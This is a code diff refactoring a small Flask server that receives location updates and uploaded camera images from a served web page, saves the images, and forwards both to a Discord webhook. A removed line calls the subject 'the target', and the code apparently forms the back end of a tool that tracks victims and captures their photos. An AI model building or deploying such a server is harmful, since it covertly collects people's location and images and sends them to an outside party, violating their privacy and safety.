@@ -1,50 +1,55 @@
-#!/usr/bin/env python3
+from flask import Flask, request, Response
 import os
 import json
 import requests
-from flask import Flask, request, Response
 import time
+from dotenv import load_dotenv
 
-# Environment variables setup
-TARGET_URL = os.getenv('TARGET_URL', 'http://localhost:8000/image')
-PORT = int(os.getenv('PORT', '8000'))
-DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL', '')
+load_dotenv()
 
 app = Flask(__name__)
 
-if not os.path.exists('image'):
-    print(f"Creating image directory at {os.getcwd()}/image")
-    os.mkdir('image')
+PORT = os.getenv("PORT", 5000)
+TARGET_URL = os.getenv("TARGET_URL", "http://localhost")
+DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
 PATH_TO_IMAGES_DIR = os.path.join(os.getcwd(), 'image')
+
+if not os.path.exists(PATH_TO_IMAGES_DIR):
+    os.makedirs(PATH_TO_IMAGES_DIR)
+
+# Utility functions
+def get_file_data(file_path):
+    with open(file_path, 'r') as open_file:
+        return open_file.read()
+
+def update_webhook(webhook_url: str, webhook_data: dict):
+    request_payload = json.dumps(webhook_data)
+    headers = {'Content-Type': 'application/json'}
+    requests.post(webhook_url, headers=headers, data=request_payload)
 
 @app.route("/", methods=["GET"])
 def get_website():
-    # Simplified to serve a static HTML file, ensure 'index.html' is in your working directory
-    return app.send_static_file('index.html')
+    try:
+        html_data = get_file_data("index.html")
+    except FileNotFoundError:
+        html_data = ""
+    return Response(html_data, mimetype="text/html")
 
 @app.route("/location_update", methods=["POST"])
 def update_location():
     data = request.json
-    if DISCORD_WEBHOOK_URL:
-        headers = {'Content-Type': 'application/json'}
-        response = requests.post(DISCORD_WEBHOOK_URL, headers=headers, json=data)
-        print(response.text)  # For debugging
+    update_webhook(DISCORD_WEBHOOK_URL, data)
     return "OK"
 
 @app.route('/image', methods=['POST'])
 def image():
-    img_file = request.files['image']
+    image_file = request.files['image']
     filename = f'{time.strftime("%Y%m%d-%H%M%S")}.jpeg'
-    img_file.save(os.path.join(PATH_TO_IMAGES_DIR, filename))
-    print(f"Picture of the target captured and saved as {filename}")
-
-    if DISCORD_WEBHOOK_URL:
-        files = {'image': open(os.path.join(PATH_TO_IMAGES_DIR, filename), 'rb')}
-        requests.post(DISCORD_WEBHOOK_URL, files=files)
-    return Response(f"{filename} saved and potentially sent to Discord webhook")
-
-def main():
-    app.run(debug=False, host="0.0.0.0", port=PORT)
+    image_path = os.path.join(PATH_TO_IMAGES_DIR, filename)
+    image_file.save(image_path)
+    files = {'image': open(image_path, 'rb')}
+    response = requests.post(DISCORD_WEBHOOK_URL, files=files)
+    return f"{filename} saved and sent to Discord webhook"
 
 if __name__ == "__main__":
-    main()
+    app.run(debug=False, host="0.0.0.0", port=PORT)
